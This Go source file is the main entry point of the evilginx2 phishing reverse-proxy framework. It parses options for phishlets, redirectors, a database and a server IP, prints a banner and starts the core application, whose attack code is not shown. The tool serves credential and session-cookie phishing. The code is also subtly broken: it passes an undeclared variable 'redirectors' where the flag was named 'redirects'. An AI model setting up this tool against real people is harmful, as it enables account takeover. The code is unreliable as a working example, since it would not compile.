package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/log"
)

const (
	version = "2.4.0"
)

func main() {
	// Parse command-line flags
	debugLog := flag.Bool("debug", false, "Enable debug logging")
	developerMode := flag.Bool("developer", false, "Enable developer mode (disables certificate verification)")
	phishlets := flag.String("p", "./phishlets", "Path to phishlets directory")
	redirects := flag.String("r", "./redirectors", "Path to redirectors directory")
	dbPath := flag.String("db", "./data.db", "Path to database file")
	serverIP := flag.String("ip", "", "Server IP address")
	flag.Parse()

	fmt.Printf(`
 ___________      .__.__           .__
 \_   _____/__  _|__|  |     ____ |__| ____ ___  ___
  |    __)_\  \/ /  |  |   / ___\|  |/    \\  \/  /
  |        \\   /|  |  |__/ /_/  >  |   |  \>    <
 /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
         \/             /_____/          \/      \/

                                         by @kgretzky
                                         version %s

`, version)

	// Initialize logger
	if *debugLog {
		log.SetLevel(log.DEBUG)
		log.Debug("Debug logging enabled")
	}

	if *developerMode {
		log.Warning("Developer mode enabled - certificate verification disabled")
	}

	// Ensure phishlets directory exists
	if _, err := os.Stat(*phishlets); os.IsNotExist(err) {
		log.Fatal("Phishlets directory not found: " + *phishlets)
		os.Exit(1)
	}

	// Initialize core application
	app, err := core.NewEvilginx(*phishlets, *redirectors, *dbPath, *serverIP, *developerMode, *debugLog)
	if err != nil {
		log.Fatal(fmt.Sprintf("Failed to initialize evilginx2: %v", err))
		os.Exit(1)
	}

	// Start the application
	if err := app.Start(); err != nil {
		log.Fatal(fmt.Sprintf("Failed to start evilginx2: %v", err))
		os.Exit(1)
	}

	// Handle OS signals for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	<-sigChan
	log.Info("Shutting down evilginx2...")
	app.Stop()
}
